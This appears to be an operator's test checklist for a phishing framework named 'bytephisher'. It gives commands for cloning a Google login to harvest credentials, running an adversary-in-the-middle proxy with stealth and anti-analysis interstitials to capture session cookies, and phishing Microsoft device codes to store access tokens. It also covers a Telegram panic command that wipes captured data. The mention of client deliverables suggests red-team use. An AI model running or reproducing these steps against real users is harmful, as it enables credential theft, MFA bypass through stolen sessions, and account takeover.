# Field test — what to run, and what to look for

This is the list to work through on a real host, in order. Nothing here needs a
specific target: each step either proves a capability or tells you the host cannot
support it. When something fails, the output of the step IS the report - the tool is
built to say why it failed, not to fail silently.

## 0. The host must be able to do the job

```bash
./.venv/bin/python tools/lab_check.py --json
```

`VERDICT: READY` means every required check passed. `BLOCKED` names the checks and the
fix. The check that matters most is **browser**: a browser that renders a `data:` URL but
cannot open a socket to a live host makes the 13 browser tasks, the takeover path and any
live view unverifiable - the tool will tell you that instead of failing halfway through.

```bash
./.venv/bin/python bytephisher.py --doctor
```

## 1. A static campaign, end to end

```bash
./.venv/bin/python bytephisher.py -o google -t none --campaign test1 --port 8080
# open http://127.0.0.1:8080/ , submit the form
./.venv/bin/python bytephisher.py --sessions
./.venv/bin/python bytephisher.py --export /tmp/out.csv --campaign test1
```

Look for: the credential appears in `--sessions` and in the export; the collector's
routes answered (no 404 in the console); the timeline has `opened` -> `creds`.

## 2. The AiTM proxy, with the current stealth defaults

```bash
./.venv/bin/python bytephisher.py --proxy --upstream <real-host> --port 8080 \
    --symbols random --verify-first -t cloudflared
```

Look for, in this order: the console prints the impersonation it chose and the random
symbol names; a first visit gets the **interstitial** (not the clone); after the page
reports back, the clone is served **with** the hook; a wrong password still gets the
real site's error; the session appears in `--sessions` with its cookies.

## 3. Device-code, and the vault

```bash
./.venv/bin/python bytephisher.py --devicecode microsoft --dc-client-id <your-app> \
    --dc-tenant <your-tenant> --port 8080
```

Look for: the code and the **real** provider URL printed; after the target approves,
`*** DEVICE CODE APPROVED ***` **and** `vault : saved as dc-<tag> (valid=True, ...)`.
Then restart the tool and confirm the token is still there:

```bash
./.venv/bin/python bytephisher.py --sessions          # the dc-<tag> record with its scopes
```

If the tenant refuses, the refusal is printed verbatim (`unauthorized_client`): that is
the tenant blocking the grant, not a bug.

## 4. A restart must not lose a session

1. Start the proxy, load the page once (a session is created).
2. Kill the process outright (`kill -9`), not a clean shutdown.
3. Start it again. The console prints `resume : restored N session(s)`.
4. Load the page again **with the same browser** - the session id must be the same one,
   with its cookies and credentials still attached.

## 5. What the record says we got

```bash
./.venv/bin/python bytephisher.py --sessions
./.venv/bin/python bytephisher.py --session <sid>
```

Every action records what it returned. An action that produced nothing is recorded as
**UNPROVEN**, never as success - if you see `unproven` in a record, that step did not
prove anything and should not go into a client deliverable as a win.

## 6. The panic path

```bash
# Telegram: /kill  (wipes the captured data and stops serving) or /panic (stops only)
```

Confirm on the host that the database file no longer contains the captured plaintext
afterwards (`grep -a` the secret in the .db and the -wal).

## What to send back

The console output of the step that failed, plus the command. That is enough: every
failure path in this tool prints its reason, and the reason is the fix.
